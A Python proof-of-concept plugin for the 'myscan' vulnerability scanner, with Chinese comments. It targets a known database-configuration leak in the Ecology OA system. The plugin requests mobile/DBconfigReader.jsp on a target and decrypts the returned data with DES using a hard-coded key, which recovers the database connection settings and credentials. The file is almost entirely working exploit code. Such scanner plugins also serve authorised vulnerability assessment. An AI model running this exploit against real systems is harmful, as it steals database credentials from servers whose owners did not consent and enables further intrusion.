# !/usr/bin/env python3
# @Time    : 2020/9/21
# @Author  : caicai
# @File    : poc_ecology_db_leak_2020.py

import pyDes
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "ecology-db-leak"
        self.vulmsg = "referer:https://github.com/jas502n/DBconfigReader"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        req = {
            "method": "GET",
            "url": self.url + "mobile/DBconfigReader.jsp",
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r is not None and r.status_code == 200:
            try:
                cipherX = pyDes.des('        ')
                cipherX.setKey('1z2x3c4v5b6n')
                result = cipherX.decrypt(r.content.strip()).strip().decode('utf-8')
                parser_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "result": result,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
            except Exception as ex:
                pass
